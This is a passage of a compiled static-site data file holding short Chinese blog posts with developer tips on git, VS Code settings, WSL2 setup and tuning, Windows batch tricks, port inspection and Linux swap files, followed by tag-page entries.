之后，只使用了第二个参数，但是又必须传入第一个参数，这就会报错了§\n第一个参数以下划线开头即可，参考 https://github.com/Microsoft/TypeScript/issues/9458 \n'},{title:"git 提交指定文件",frontmatter:{title:"git 提交指定文件",date:"2021-10-09 22:57:01",tags:["vscode","git"],categories:"tools",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_commit_single_file.html",relativePath:"blogs/vscode/vscode_commit_single_file.md",key:"v-bb99a562",path:"/blogs/vscode/vscode_commit_single_file.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 方式一： \n 先将指定文件添加到 暂存区，然后提交所有 暂存区 的文件 \n git   add  index.html about.html\n git  commit -m  '我提交了所有 暂存区 的文件' \n \n 1 2 #  方式二： \n 此方式可以提交分别来自不同地方的文件，比如 工作区的 和 暂存区的 \n git  commit -o index.html about.html -m  '我同时提交了 工作区的index.html 和 暂存区的about.html 这两个文件' \n \n 1 "},{title:"Vs Code 格式化代码",frontmatter:{title:"Vs Code 格式化代码",date:"2021-05-23T15:24:12.000Z",tags:["format","vscode"],categories:"hot-key",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_format_code.html",relativePath:"blogs/vscode/vscode_format_code.md",key:"v-3caae1b5",path:"/blogs/vscode/vscode_format_code.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 使用快捷键 \n alt + shift + f \n"},{title:"Vs Code中不再支持JDK8的解决方案",frontmatter:{title:"Vs Code中不再支持JDK8的解决方案",date:"2021-10-09 23:31:02",tags:["jdk"],categories:"vscode",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_notsupport_jdk8.html",relativePath:"blogs/vscode/vscode_notsupport_jdk8.md",key:"v-7a72b4d5",path:"/blogs/vscode/vscode_notsupport_jdk8.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' \n 解决方案1 \n \n 如果不是必须使用JDK8，可以选择更换为JDK11或更新 \n \n 解决方案2 \n \n 官方说可以在settings.json中配置java.configuration.runtimes，这个配置仍然支持Java1.5到14\n不过依旧需要安装JDK11，用来启动Java语言服务器，具体的编译版本则可以自行选择 \n "java.home" :   "/path/to/jdk-11" , \n "java.configuration.runtimes" :   [ \n   { \n     "name" :   "JavaSE-1.8" , \n     "path" :   "/path/to/jdk-8" , \n     "default" :   true \n   } , \n   { \n     "name" :   "JavaSE-11" , \n     "path" :   "/path/to/jdk-11" , \n   } , \n ] \n \n 1 2 3 4 5 6 7 8 9 10 11 12 \n 解决方案3\n照常使用以前版本，直接选中该拓展的设置–>安装另一个版本–>选择安装的版本：0.64.1 \n \n 然后关闭拓展更新：\n在设置中关闭Extensions: Auto Update \n'},{title:"Vscode 给不同文件定义不同缩进",frontmatter:{title:"Vscode 给不同文件定义不同缩进",date:"2021-10-31 13:48:25",tags:["vscode"],categories:"setting",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_override_user_setting.html",relativePath:"blogs/vscode/vscode_override_user_setting.md",key:"v-0e672596",path:"/blogs/vscode/vscode_override_user_setting.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 有时候Vscode 同时导入了多种项目，比如java和angular，就需要对它们进行不同方式缩进设置。 \n \n 安装EditorConfig 插件 \n 在工作空间根目录新建.editorconfig文件 \nEditor configuration, see https://editorconfig.org \nroot = true\n\n [ * ] \ncharset = utf - 8 \nindent_style = space\nindent_size = 2\ninsert_final_newline = true\ntrim_trailing_whitespace = true\nquote_type = single\n\n [ *.java ] \nindent_style = space\nindent_size = 4\neditor.tabSize = 4\n\n [ *.md ] \nmax_line_length = off\ntrim_trailing_whitespace = false\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 "},{title:"在VSCode中默认使用settings.json中定义的TypeScript版本",frontmatter:{title:"在VSCode中默认使用settings.json中定义的TypeScript版本",date:"2021-05-23T15:43:53.000Z",tags:["vscode"],categories:"setting",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_set_typescript_version.html",relativePath:"blogs/vscode/vscode_set_typescript_version.md",key:"v-2f696eaf",path:"/blogs/vscode/vscode_set_typescript_version.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 当VSCode打开typescript文件,使用node_modules里面的TypeScript版本，而不是VSCode的版本 \n 快捷键  Ctrl + ,  打开settings.json，添加如下设置 \n "typescript.tsdk" :   "node_modules/typescript/lib" , \n \n 1 然后打开右下角typescript版本，选择 Use Workspace Version \n'},{title:"Vs code TSLint 运行报错",frontmatter:{title:"Vs code TSLint 运行报错",date:"2021-05-23T17:22:48.000Z",tags:["vscode","tslint"],categories:"setting",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_tslint_running_error.html",relativePath:"blogs/vscode/vscode_tslint_running_error.md",key:"v-17fc0e0f",path:"/blogs/vscode/vscode_tslint_running_error.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" Not using the local TSLint version found for '/Users/myname/myproject/client/src/app/likes/likee/likee.component.ts'. To enable code execution from the current workspace you must enable workspace library execution.\n \n 打开快捷键 Ctrl  + Shift  + P \n 选择 TSLint: Manage workspace library execution \n 然后按回车 \n 选择 enable workspace library execution 选项\n按回车确认 \n"},{title:"Vs Code 关闭单词拼写错误 警告 Unknown word",frontmatter:{title:"Vs Code 关闭单词拼写错误 警告 Unknown word",date:"2021-05-23T17:29:36.000Z",tags:["vscode"],categories:"hot-key",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/vscode/vscode_turn_off_word_misspelling_warnings.html",relativePath:"blogs/vscode/vscode_turn_off_word_misspelling_warnings.md",key:"v-3b273055",path:"/blogs/vscode/vscode_turn_off_word_misspelling_warnings.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 快捷键  Ctrl + ,  打开settings.json，添加如下设置 \n "cSpell.diagnosticLevel": "Hint",\n \n 1 '},{title:"windows下 在cmd中输入ls命令出现“ls不是内部或外部命令“解决方法",frontmatter:{title:"windows下 在cmd中输入ls命令出现“ls不是内部或外部命令“解决方法",date:"2021-08-29 10:51:11",tags:["command"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows-ls-command.html",relativePath:"blogs/windows/windows-ls-command.md",key:"v-1be519e2",path:"/blogs/windows/windows-ls-command.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 在cmd中输入ls命令出现“ls不是内部或外部命令解决\n因为与这个命令相似的功能是dir，所以以下方法可解决： \n \n 在C：\\windows目录下新建一个文件命名为ls.bat \n 打开编辑这个文件 输入： \n \n @echo off\n dir \n \n 1 2 这两句保存即可。 \n"},{title:"批处理文件开机自启动",frontmatter:{title:"批处理文件开机自启动",date:"2021-03-03T10:37:56.000Z",tags:["vbs","cmd"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_batch_file_to_start_automatically_at_boot.html",relativePath:"blogs/windows/windows_batch_file_to_start_automatically_at_boot.md",key:"v-6d232af5",path:"/blogs/windows/windows_batch_file_to_start_automatically_at_boot.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 打开开始菜单中的启动i项文件夹 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup，把需要启动的文件复制到这里，电脑重启后就可以自启动了。 \n"},{title:"Windows 中的 mklink 命令",frontmatter:{title:"Windows 中的 mklink 命令",date:"2021-05-23T15:38:12.000Z",tags:["mklink","command"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_command_mklink.html",relativePath:"blogs/windows/windows_command_mklink.md",key:"v-29c37f5d",path:"/blogs/windows/windows_command_mklink.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' Windows链接 \n 比如把修改VScode 插件安装目录 \n 把C:\\Users{username}.vscode\\extensions(默认插件位置)的extensions文件夹整个剪切到你想换的位置 \n cmd 执行 \n mklink /D "C:\\Users\\{username}\\.vscode\\extensions" "剪切后的路径"\n \n 1 '},{title:"修改 WSL2 可用内存大小和交换分区大小",frontmatter:{title:"修改 WSL2 可用内存大小和交换分区大小",date:"2021-12-19 17:24:20",tags:["wsl2","swap"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_wls2_set_swap.html",relativePath:"blogs/windows/windows_wls2_set_swap.md",key:"v-08e69af5",path:"/blogs/windows/windows_wls2_set_swap.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" WSL2默认可以使用的内存大小为主机的80%,对于Linux而言即使装了桌面,一般的开发也没必要给这么多内存,分多了,反而有可能卡主机的Windows\n操作:\n1.打开Windows资源管理器,地址栏输入  %UserProfile%  回车,在该目录下创建一个文件, 名字为  .wslconfig  ,写入内容示例如下 (我电脑8GB内存,分给WSL内存2GB,另外设置交换分区4GB) \n [ wsl2 ] \nmemory=10GB\nswap=20GB\nlocalhostForwarding=true\n \n 1 2 3 4 cmd执行  wsl --shutdown  关闭WSL,再重新打开即可 \n"},{title:"Windows10 子系统(WSL2) 安装",frontmatter:{title:"Windows10 子系统(WSL2) 安装",date:"2021-11-25 11:36:45",tags:["wsl2","windows"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_wsl2_install.html",relativePath:"blogs/windows/windows_wsl2_install.md",key:"v-5c54710e",path:"/blogs/windows/windows_wsl2_install.html",headers:[{level:2,title:"先决条件",slug:"先决条件"},{level:2,title:"安装",slug:"安装"},{level:3,title:"列出可用发行版",slug:"列出可用发行版"},{level:3,title:"将wsl2设置为默认",slug:"将wsl2设置为默认"},{level:3,title:"cmd 管理员 打开",slug:"cmd-管理员-打开"},{level:3,title:"安装 Ubuntu-20.04",slug:"安装-ubuntu-20-04"},{level:3,title:"升级 Ubuntu-20.04 可选",slug:"升级-ubuntu-20-04-可选"},{level:2,title:"启动",slug:"启动"},{level:2,title:"退出",slug:"退出"},{level:2,title:"关机",slug:"关机"},{level:2,title:"访问windows 文件",slug:"访问windows-文件"},{level:2,title:"修改安装目录",slug:"修改安装目录"},{level:3,title:"使用 wsl",slug:"使用-wsl"},{level:3,title:"使用LxRunOffline",slug:"使用lxrunoffline"},{level:2,title:"更换镜像源",slug:"更换镜像源"},{level:2,title:"Xshell连接win10 Linux子系统",slug:"xshell连接win10-linux子系统"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 先决条件 \n 必须运行 Windows 10 版本 2004 及更高版本（内部版本 19041 及更高版本）或 Windows 11。\n以下命令皆在windows 终端预览版打开 \n 子系统和本机公用相同端口，要避免端口冲突 \n 安装 \n 列出可用发行版 \n wsl -l -o\n \n 1 #  将wsl2设置为默认 \n wsl --set-default-version  2 \n \n 1 #  cmd 管理员 打开 \n 启用后 模拟器和vmware都无法使用 VM VirtualBox 可以使用 关闭设置为off\n启用虚拟机平台 Windows 功能并确保在 BIOS 中启用虚拟化 \n bcdedit /set hypervisorlaunchtype auto\n \n 1 #  安装 Ubuntu-20.04 \n wsl --install -d Ubuntu-20.04\n \n 1 #  升级 Ubuntu-20.04 可选 \n wsl.exe --set-version Ubuntu-20.04  2 \n \n 1 #  启动 \n wsl\n \n 1 #  退出 \n exit \n \n 1 #  关机 \n wsl --shutdown\n \n 1 #  访问windows 文件 \n ll /mnt\n \n 1 #  修改安装目录 \n 使用 wsl \n \n 首先查看所有分发版本 \n \n wsl -l --all  -v\n \n 1 \n 导出分发版为tar文件到d盘 \n \n wsl --export Ubuntu-20.04 d: \\ ubuntu20.04.tar\n \n 1 \n 注销当前分发版 \n \n wsl --unregister Ubuntu-20.04\n \n 1 \n 重新导入并安装分发版在d:ubuntu \n \n wsl --import Ubuntu-20.04 d: \\ ubuntu d: \\ ubuntu20.04.tar\n \n 1 \n 设置默认登陆用户为安装时用户名 \n \n '/C/Program Files/WindowsApps/CanonicalGroupLimited.Ubuntu20.04onWindows_2004.2021.825.0_x64__79rhkp1fndgsc/ubuntu2004.exe'  config --default-user ubuntu\n \n 1 '/C/Program Files/WindowsApps/CanonicalGroupLimited.Ubuntu20.04onWindows_2004.2021.825.0_x64__79rhkp1fndgsc/ubuntu2004.exe'  config --default-user root\n \n 1 \n 删除tar文件(可选) \n \n rm  /d/ubuntu20.04.tar\n \n 1 #  使用LxRunOffline \n \n 首先查看所有分发版本 \n \n '/D/Program Files/LxRunOffline/LxRunOffline'  list\n \n 1 = 查看安装路径 \n '/D/Program Files/LxRunOffline/LxRunOffline'  get-dir -n Ubuntu-20.04\n \n 1 \n 子系统迁移 \n \n '/D/Program Files/LxRunOffline/LxRunOffline'  move -n Ubuntu-20.04 -d /d/ubuntu/\n \n 1 查询系统目录，查看是否迁移成功 \n 如果迁移后查询系统目录仍然在C潘，可以尝试删除子系统再重新下载来重试。 \n 更换镜像源 \n \n 备份配置文件 \n \n sudo   cp  -a /etc/apt/sources.list /etc/apt/sources.list.bak\n \n 1 \n 修改sources.list文件 \n \n 将http://archive.ubuntu.com和http://security.ubuntu.com替换成http://192.168.2.10:8081/repository/apt-huawei\n\n sudo   sed  -i  \"s@http://.*archive.ubuntu.com@http://192.168.2.10:8081/repository/apt-huawei/@g\"  /etc/apt/sources.list\n sudo   sed  -i  \"s@http://.*security.ubuntu.com@http://192.168.2.10:8081/repository/apt-huawei/@g\"  /etc/apt/sources.list\n \n 1 2 3 4 \n 更新索引 \n \n apt-get  update\n \n 1 #  Xshell连接win10 Linux子系统 \n \n 查看ip \n \n ifconfig \n \n 1 \n 配置SSH服务 \n \n ## 先删ssh \n sudo   apt-get  remove --purge openssh-server\n  ## 在安装ssh \n sudo   apt-get   install  openssh-server\n  ## 删配置文件，让ssh服务自己想办法链接 \n sudo   rm  /etc/ssh/ssh_config\n sudo   service   ssh  --full-restart\n \n 1 2 3 4 5 6 7 \n 使用Xshell登录\n上面命令执行完之后，在xshell中输入用户名和ip就可以通过xshell登录自己电脑的Linux。 \n \n"},{title:"如何从WSL中删除windows的PATH",frontmatter:{title:"如何从WSL中删除windows的PATH",date:"2021-12-19 17:54:55",tags:["wsl","path"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_wsl_remove_windows_path.html",relativePath:"blogs/windows/windows_wsl_remove_windows_path.md",key:"v-7d1774f5",path:"/blogs/windows/windows_wsl_remove_windows_path.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 编辑  ~/.bashrc  文件, 添加下面内容 \n PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\n \n 1 "},{title:"WSL 和 WSL2 简单对比",frontmatter:{title:"WSL 和 WSL2 简单对比",date:"2021-12-19 17:10:43",tags:["wsl","wsl2"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_wsl_wsl2.html",relativePath:"blogs/windows/windows_wsl_wsl2.md",key:"v-6189ebda",path:"/blogs/windows/windows_wsl_wsl2.html",headers:[{level:2,title:"功能",slug:"功能"},{level:3,title:"WSL2 的优势",slug:"wsl2-的优势"},{level:3,title:"WSL2 的劣势",slug:"wsl2-的劣势"},{level:3,title:"WSL2 的功能缺失，相对于原生的（包括虚拟机中的） Linux",slug:"wsl2-的功能缺失-相对于原生的-包括虚拟机中的-linux"},{level:2,title:"性能",slug:"性能"},{level:3,title:"WSL2 的优势",slug:"wsl2-的优势-2"},{level:3,title:"WSL2 的劣势",slug:"wsl2-的劣势-2"},{level:2,title:"总结",slug:"总结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 以一个普通用户的角度总结下 WSL 和 WSL2 的区别。\n主要从功能、性能两个方面简单说下 WSL2 和 WSL 相比的优势和劣势。本来想单独列下易用性，但发现都可以在功能和性能上体现出来。 \n 功能 \n WSL2 的优势 \n 因为 WSL2 是跑在虚拟机中的完整 Linux，所以功能方面要比 WSL 强大一些。从目前的版本看，至少能做到如下这些 WSL 做不到的事情（并没有全部核实，可能有出入）： \n \n 网卡管理、网络抓包、查看网络连接状态、防火墙等较底层的网络相关功能。 \n 挂载文件（如 ext4 文件、squashfs 文件）和网络资源（如 nfs、ssh ）到本地。 \n tmpfs （在 /run/shm 或者 /dev/shm，/tmp 不是）。 \n 完整的 cgroups，因此可以运行 Docker 等容器。 \n 完整的 IPC （ WSL 缺失一部分，比如运行不了 fakeroot ）。 \n 可修改内核参数、添加内核模块，以及替换内核。因此可以支持很多更底层的应用。 \n 因为之上的这些原因，WSL2 可以更好地享受完整 Linux 系统带来的方便，不需要因为 WSL 的功能缺失而使用各种迂回方法。 \n WSL2 的劣势 \n 功能方面的劣势，主要是和本机系统（即 Windows 宿主机）整合相关的。 \n \n 进程不再会显示在任务管理器里，也无法在 WSL2 外操作，包括不再支持本机系统的防火墙规则。 \n 无法通过 localhost （ 127.0.0.1 ）访问本机系统监听的端口（也许以后会支持。目前用 localhost 是可以从本机系统访问 WSL2 的），只能通过其他 IP。 \n 默认无法从其他机器访问到 WSL2 中监听的端口，需要在本机系统设置端口转发（如 netsh interface portproxy add ）。\n其中 2 和 3 后续都可能优化，技术上没有难题。 \n WSL2 的功能缺失，相对于原生的（包括虚拟机中的） Linux \n \n 没有声音、显示系统，和 WSL 一致。但有迂回办法（不包括显卡计算）。 \n 不能访问本机系统的 USB 设备（但可以访问已经在本机系统挂载的硬盘、U 盘、光盘等）、串口设备（这个 WSL 已经支持，WSL2 之后也会支持）、PCI 设备等等。 \n 网卡管理相关功能不全，比如不能设置静态 IP、不能桥接、不能访问网卡硬件等等。 \n \n 但 WSL2 的文件系统镜像可以直接使用 Hyper-V 挂载（可以一个镜像两用，不能同时运行），这样功能比 WSL2 要强一些（比如有显示系统、网卡管理、串口设备支持、受限的本机硬盘直通等等），但还是有一些功能缺失 \n 性能 \n 性能方面，WSL 和 WSL2 各有优势。如果不和本机系统交互，WSL2 的性能非常不错，但访问本机系统的文件会下降很多。 \n WSL2 的优势 \n \n 进程启动开销大大减少，需要频繁启动进程的场景性能大幅提升。 \n 本地磁盘（不包括挂载的  /mnt/* ）读写性能大幅提升。 \n WSL2 的劣势 \n \n 通过 9p 挂载的本机系统文件（ /mnt/* ）和 WSL 中的 drvfs 相比，读写性能大幅下降，主要体现在读取大量小文件场景（比如文件数上百后， ls -l 、 file * 、 head -n1 * 、 git status/diff/...  等等命令会有明显卡顿，耗时为 WSL 中的几倍甚至十几倍）。但仅仅列文件名（ ls 要比 ls -l 快几个数量级）或者操作大文件（比如用 dd 读写大文件感觉不到慢）基本没影响。 \n 内存占用比 WSL 高很多。基本运行起来后就要占 300M 以上（要看 Vmmem 进程，而不是终端模拟器）。而且读写大量本地系统文件（ /mnt/* ）后内存会飙升，至少有些情况不会回落，即使其他软件将内存快耗尽了 Vmmem 内存占用也不会下降。 \n 首次启动比 WSL 慢，但平时不需要退出（ wsl --shutdown，可以用它来释放内存），可以认为没影响。\n其中 1 也许可以大幅优化，2 之后很可能会优化 \n 总结 \n 总体说功能上变得更强大了，但和本机系统交互的相关功能有所减弱，用起来没有之前方便了。性能上如果不需要和本机系统交互，提升很显著，但如果需要读写本机系统硬盘的文件，性能下降很明显。 \n"},{title:"修改 PowerShell 代码页为 UTF-8",frontmatter:{title:"修改 PowerShell 代码页为 UTF-8",date:"2021-05-15T12:10:42.000Z",tags:["powershell"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windows_xiu-gai-powershell-dai-ma-ye-wei-utf-8.html",relativePath:"blogs/windows/windows_xiu-gai-powershell-dai-ma-ye-wei-utf-8.md",key:"v-7082447d",path:"/blogs/windows/windows_xiu-gai-powershell-dai-ma-ye-wei-utf-8.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 通过注册表修改 \n 以下代码存为 *.reg 文件： \n Windows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe]\n"CodePage"=dword:0000fde9\n \n 1 2 3 4 双击运行此文件。 \n 注： \n \n \n 65001(UTF-8) 的十六进制表示为：0000fde9 \n \n \n 963(GBK) 的十六进制表示为：000003a8 \n 手动修改 \n 每次启动后输入： chcp 65001 \n 第三方控制台 \n Conemu/Cmder \n 在此 Settings>Startup>Environment 选项下，添加 chcp 65001\n注：yarn 的进度条在其中有问题 \n'},{frontmatter:{layout:"TimeLines",title:"Timeline"},regularPath:"/timeline/",key:"v-6319eb4e",path:"/timeline/",content:""},{title:"bat 批处理文件运行时隐藏cmd 窗口",frontmatter:{title:"bat 批处理文件运行时隐藏cmd 窗口",date:"2021-03-03T10:04:14.000Z",tags:["bat","cmd","vbs"],categories:"windows",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/windows/windwos_hide_cmd_window_when_bat_batch_file_is_running.html",relativePath:"blogs/windows/windwos_hide_cmd_window_when_bat_batch_file_is_running.md",key:"v-d48c57ee",path:"/blogs/windows/windwos_hide_cmd_window_when_bat_batch_file_is_running.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 直接执行cmd 命令的时候，显示的黑框不太美观。可以把黑框隐藏掉。推荐使用第一种。 \n \n 新建个vbs文件 \n \n set ws=WScript.CreateObject("WScript.Shell") \n\'ws.Run "yy.bat",0\n\nDim cmd1\ncmd = "java -jar 11.war"\n\'ws.Run cmd, 0\n \n 1 2 3 4 5 6 可以在vbs 文件调用需要执行的批处理文件，或者把批处理直接定义在vbs 里面 \n \n 编辑bat文件，在开头处写入 \n \n @echo off\nif "%1" == "h" goto begin\nmshtavbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit\n:begin\nREM\n \n 1 2 3 4 5 缺点：这个方法运行bat时，cmd窗口还是闪了一下。 \n'},{title:"查看端口占用情况",frontmatter:{title:"查看端口占用情况",date:"2021-10-23 11:17:53",tags:["linux","windows"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux-check-port-usage.html",relativePath:"blogs/linux/linux-check-port-usage.md",key:"v-cb3a0bae",path:"/blogs/linux/linux-check-port-usage.html",headers:[{level:2,title:"lsof",slug:"lsof"},{level:3,title:"常用命令",slug:"常用命令"},{level:2,title:"netstat",slug:"netstat"},{level:2,title:"ps",slug:"ps"},{level:2,title:"kill",slug:"kill"},{level:2,title:"查找所有运行的端口",slug:"查找所有运行的端口"},{level:2,title:"查看被占用端口对应的 PID",slug:"查看被占用端口对应的-pid"},{level:2,title:"查看指定 PID 的进程",slug:"查看指定-pid-的进程"},{level:2,title:"结束进程",slug:"结束进程"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' linux \n Linux 查看端口占用情况可以使用  lsof  和  netstat  命令。 \n lsof \n lsof(list open files)是一个列出当前系统打开文件的工具。 \n 常用命令 \n \n 查看端口占用： \n \n lsof  -i:端口号\n \n 1 \n 查看端口占用PID： \n \n lsof  -i:端口号 -t\n \n 1 #  netstat \n netstat -tunlp 用于显示 tcp，udp 的端口和进程等相关情况。 \n netstat 查看端口占用语法格式： \n netstat  -tunlp  |   grep  端口号\n \n 1 \n -t (tcp) 仅显示tcp相关选项 \n -u (udp)仅显示udp相关选项 \n -n 拒绝显示别名，能显示数字的全部转化为数字 \n -l 仅列出在Listen(监听)的服务状态 \n -p 显示建立相关链接的程序名 \n \n 更多命令： \n netstat  -ntlp   //查看当前所有tcp端口\n netstat  -ntulp  |   grep   80    //查看所有80端口使用情况\n netstat  -ntulp  |   grep   3306    //查看所有3306端口使用情况\n netstat  -anp  |   grep   ssh     // 查看进程占用的端口\n \n 1 2 3 4 #  ps \n Linux ps （英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器。 \n 语法 \n ps   [ options ]   [ --help ] \n \n 1 ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义 \n \n -A 列出所有的进程 \n -w 显示加宽可以显示较多的资讯 \n -au 显示较详细的资讯 \n -aux 显示所有包含其他使用者的行程 \n au(x) 输出格式 \n \n 查找指定进程格式： \n ps  -aux  |   grep  进程关键字 ( 可以是端口号 ) \n \n 1 #  kill \n 在查到端口占用的进程后，如果你要杀掉对应的进程可以使用 kill 命令： \n kill  -9 PID\n \n 1 杀死占用某端口的所有进程 \n kill  -9  $( lsof  -i:端口号 -t ) \n \n 1 #  windows \n 查找所有运行的端口 \n 输入命令： \n netstat  -ano\n \n 1 #  查看被占用端口对应的 PID \n 输入命令： \n netstat  -aon | findstr  "8081" \n \n 1 #  查看指定 PID 的进程 \n 继续输入命令： \n tasklist | findstr  "9088" \n \n 1 #  结束进程 \n 强制（/F参数）杀死 pid 为 9088 的所有进程包括子进程（/T参数）： \n taskkill /T /F /PID  9088 \n \n 1 '},{title:"Linux 系统添加和删除 Swap 交换文件",frontmatter:{title:"Linux 系统添加和删除 Swap 交换文件",date:"2021-08-29T09:36:24.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux-add-delete-swap.html",relativePath:"blogs/linux/linux-add-delete-swap.md",key:"v-58a72a75",path:"/blogs/linux/linux-add-delete-swap.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 简介 \n Linux 系统中的 Swap 分区，即交换分区，类似于 Windows 的虚拟内存，其作用可简单的描述为：当系统的物理内存不够用的时候，将暂时不用的数据存放到交换空间所在的硬盘上，从而可以腾出内存来让别的程序运行。\n在这里不讨论直接划出一部分硬盘作为交换分区的情况，只介绍通过添加 Swap 文件来设置交换分区的方式。 \n 添加 Swap 文件 \n 随便进入一个目录用于后续存放 Swap 文件，也可以直接放在根目录，这里放在 /var 目录下 \n cd  /var\n \n 1 使用 dd 命令生成一个文件块，大小为自己想设置的 Swap 分区大小，这里生成一个名为 swapfile 的文件，大小设为 1G。 \n dd   if = /dev/zero  of = swapfile  bs = 1M  count = 1024 \n \n 1 将该文件设为 Swap 文件（格式化）。 \n mkswap  swapfile\n \n 1 另外为了安全建议将交换分区文件权限设为 0600 或 0644 ，执行以下命令。 \n chmod  0600 swapfile\n \n 1 激活 Swap 文件（启用虚拟内存）。 \n swapon  swapfile\n \n 1 检查 Swap 是否正确。 \n swapon  -s\n \n 1 此时已经成功添加了交换分区，可以使用 free 之类的命令查看验证。\n但这样重启后 Swap 分区会丢失，需要重新激活才行，所以我们一般在 fstab 文件为其添加开机自动挂载设置。 \n vim  /etc/fstab\n \n 1 按 i 进入编辑模式\n在最后增加以下内容： \n /var/swapfile swap swap defaults  0   0 \n \n 1 按 Esc 退出编辑模式\n输入 :wq 保存修改的内容并退出。 \n 也可以直接执行如下命令来添加： \n echo   "/var/swapfile swap swap defaults 0 0"   >>  /etc/fstab\n \n 1 #  删除 Swap 文件 \n 这里以我们上面设置的 Swap 文件（文件名、文件路径）作为示范。\n首先将 Swap 文件取消激活： \n swapoff /var/swapfile\n \n 1 然后删除我们设置的 Swap 文件： \n rm  /var/swapfile\n \n 1 最后再编辑 /fstab 文件删除掉自动挂载 Swap 的设置即可： \n vim  /etc/fstab\n \n 1 '},{frontmatter:{layout:"Tags",title:"Tags"},regularPath:"/tag/",key:"v-b1564aac",path:"/tag/",content:""},{frontmatter:{layout:"FrontmatterKey",title:"Categories"},regularPath:"/categories/",key:"v-ef9325c4",path:"/categories/",content:""},{frontmatter:{layout:"Tag",title:"Angular Tags"},regularPath:"/tag/Angular/",key:"v-be663952",path:"/tag/Angular/",content:""},{frontmatter:{layout:"Tag",title:"Python Tags"},regularPath:"/tag/Python/",key:"v-4aea34c9",path:"/tag/Python/",content:""},{frontmatter:{layout:"Tag",title:"JavaScript Tags"},regularPath:"/tag/JavaScript/",key:"v-7a5f6990",path:"/tag/JavaScript/",content:""},{frontmatter:{layout:"Tag",title:"back-end Tags"},regularPath:"/tag/back-end/",key:"v-67132c70",path:"/tag/back-end/",content:""},{frontmatter:{layout:"Tag",title:"front-end Tags"},regularPath:"/tag/front-end/",key:"v-18535602",path:"/tag/front-end/",content:""},{frontmatter:{layout:"Tag",title:"list Tags"},regularPath:"/tag/list/",key:"v-1442ba32",path:"/tag/list/",content:""},{frontmatter:{layout:"Tag",title:"map Tags"},regularPath:"/tag/map/",key:"v-32330806",path:"/tag/map/",content:""},{frontmatter:{layout:"Tag",title:"command Tags"},regularPath:"/tag/command/",key:"v-a93aca24",path:"/tag/command/",content:""},{frontmatter:{layout:"Tag",title:"frp Tags"},regularPath:"/tag/frp/",key:"v-3238e596",path:"/tag/frp/",content:""},{frontmatter:{layout:"Tag",title:"Gridea Tags"},regularPath:"/tag/Gridea/",key:"v-62433803",path:"/tag/Gridea/",content:""},{frontmatter:{layout:"Tag",title:"maven Tags"},regularPath:"/tag/maven/",key:"v-7189f9a4",path:"/tag/maven/",content:""},{frontmatter:{layout:"Tag",title:"idea Tags"},regularPath:"/tag/idea/",key:"v-149c40a4",path:"/tag/idea/",content:""},{frontmatter:{layout:"Tag",title:"ftp Tags"},regularPath:"/tag/ftp/",key:"v-3238d692",path:"/tag/ftp/",content:""},{frontmatter:{layout:"Tag",title:"sftp Tags"},regularPath:"/tag/sftp/",key:"v-138024d4",path:"/tag/sftp/",content:""},{frontmatter:{layout:"Tag",title:"scp Tags"},regularPath:"/tag/scp/",key:"v-322d848e",path:"/tag/scp/",content:""},{frontmatter:{layout:"Tag",title:"angular Tags"},regularPath:"/tag/angular/",key:"v-c61b0192",path:"/tag/angular/",content:""},{frontmatter:{layout:"Tag",title:"UI Tags"},regularPath:"/tag/UI/",key:"v-e8d9159e",path:"/tag/UI/",content:""},{frontmatter:{layout:"Tag",title:"java Tags"},regularPath:"/tag/java/",key:"v-14824c3a",path:"/tag/java/",content:""},{frontmatter:{layout:"Tag",title:"javascript 